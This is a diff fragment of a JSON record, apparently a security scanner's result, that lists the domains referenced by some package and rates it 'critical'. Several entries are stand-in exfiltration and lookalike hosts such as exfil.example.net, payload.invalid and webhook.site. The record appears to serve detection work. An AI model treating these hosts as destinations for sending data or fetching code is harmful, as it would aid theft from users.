+    "exfil.example.net",
+    "fallback.example.com",
+    "files.api.acme.test",
+    "finnhub.io",
+    "forecast-cdn.invalid",
+    "genai.owasp.org",
+    "generativelanguage.googleapis.com",
+    "github.com",
+    "glot.io",
+    "hooks.example",
+    "hooks.example.invalid",
+    "hooks.slack.com",
+    "install.app-distribution.net",
+    "ironheights.dev",
+    "json-schema.org",
+    "keys.bear.app",
+    "laosji.net",
+    "lookalike-cli.vercel.app",
+    "lookalike-cli.vercel.app.invalid",
+    "new.example.org",
+    "openclawcli.vercel.app",
+    "openvex.dev",
+    "payload.invalid",
+    "pbs.twimg.com",
+    "provider.com",
+    "registry.bear.app",
+    "registry.npmjs.org",
+    "rentry.co",
+    "rentry.co.invalid",
+    "resend.com",
+    "schemas.openxmlformats.org",
+    "schemas.openxmlformats.org.invalid",
+    "slsa.dev",
+    "social.bear.app",
+    "swcdn.apple.com",
+    "updates.example",
+    "vendor.invalid",
+    "videos.bear.app",
+    "webhook.site",
+    "webhook.site.invalid",
+    "widgets.example.ts.net",
+    "www.apache.org",
+    "www.ironheights.dev",
+    "www.moltbook.com",
+    "www.opencre.org",
+    "www.rescuetime.com",
+    "www.w3.org",
+    "x.example",
+    "x.example.net",
+    "x.googleapis.com",
+    "x.invalid",
+    "xkcd.com",
+    "y.example"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
